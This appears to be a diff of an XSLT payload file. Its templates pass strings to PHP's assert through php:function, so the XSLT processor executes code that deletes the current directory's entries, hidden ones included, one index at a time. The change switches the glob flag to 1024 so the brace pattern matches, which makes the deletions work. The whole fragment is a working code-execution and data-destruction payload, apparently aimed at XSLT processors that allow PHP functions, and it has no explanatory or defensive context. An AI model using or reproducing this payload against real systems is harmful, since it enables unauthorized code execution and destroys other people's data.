@@ -4,18 +4,18 @@
   <xsl:template match="*">
 
    
-           <xsl:variable name="f">rmdir(glob('./{,.}*','0')[0])</xsl:variable>                                                    
+           <xsl:variable name="f">rmdir(glob('./{,.}*',1024)[0])</xsl:variable>                                                    
         <xsl:value-of select="php:function('assert', $f)"/> 
    
-           <xsl:variable name="g">rmdir(glob('./{,.}*','1')[1])</xsl:variable>                                                    
+           <xsl:variable name="g">rmdir(glob('./{,.}*',1024)[1])</xsl:variable>                                                    
         <xsl:value-of select="php:function('assert', $g)"/> 
    
-           <xsl:variable name="h">rmdir(glob('./{,.}*','2')[2])</xsl:variable>                                                    
+           <xsl:variable name="h">rmdir(glob('./{,.}*',1024)[2])</xsl:variable>                                                    
         <xsl:value-of select="php:function('assert', $h)"/> 
-      <xsl:variable name="i">rmdir(glob('./{,.}*','3')[3])</xsl:variable>                                                    
+      <xsl:variable name="i">rmdir(glob('./{,.}*',1024)[3])</xsl:variable>                                                    
         <xsl:value-of select="php:function('assert', $i)"/> 
    
-           <xsl:variable name="j">rmdir(glob('./{,.}*','4')[4])</xsl:variable>                                                    
+           <xsl:variable name="j">rmdir(glob('./{,.}*',1024)[4])</xsl:variable>                                                    
         <xsl:value-of select="php:function('assert', $j)"/> 
    
            <xsl:variable name="k">rmdir(glob('./{,.}*','5')[5])</xsl:variable>                                                    
